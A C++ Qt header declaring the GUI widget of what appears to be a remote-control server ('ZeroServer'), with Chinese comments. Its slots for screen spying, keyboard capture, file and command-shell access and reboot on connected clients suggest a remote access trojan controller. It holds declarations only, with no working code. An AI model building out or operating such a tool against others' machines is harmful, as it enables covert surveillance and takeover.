#ifndef WIDGET_H
#define WIDGET_H

#include <QWidget>
#include <QDesktopWidget>
#include <QPushButton>
#include <QTableWidget>
#include <QMenu>
#include <QMouseEvent>
#include <QDebug>
#include <QCursor>
#include "zeroserver.h"
namespace Ui {
class Widget;
}

class Widget : public QWidget
{
    Q_OBJECT

public:
    explicit Widget(QWidget *parent = nullptr);
    ~Widget();

private:
    Ui::Widget *ui;
    QTableWidget *mClientTable; // 客户列表
    QMenu *mPopupMenu;          // 弹出菜单
    ZeroServer *mZeroServer;    // 服务端
public slots:
    void screenSpyClicked();
    void keyboardClicked();
    void fileSpyClicked();
    void cmdSpyClicked();
    void sendMessageClicked();
    void rebootClicked();
    void quitClicked();

    // 添加客户到列表
    void addClientToTable(int id, QString name, QString ip, int port, QString systemInfo);

    // 从列表中删除客户
    void removeClientFromTable(int id);

    // 当前选中的客户ID
    int currentClientIdFromTable();

protected:
    // 事件过滤，不是很明白
    bool eventFilter(QObject *watched, QEvent *event);


};

#endif // WIDGET_H
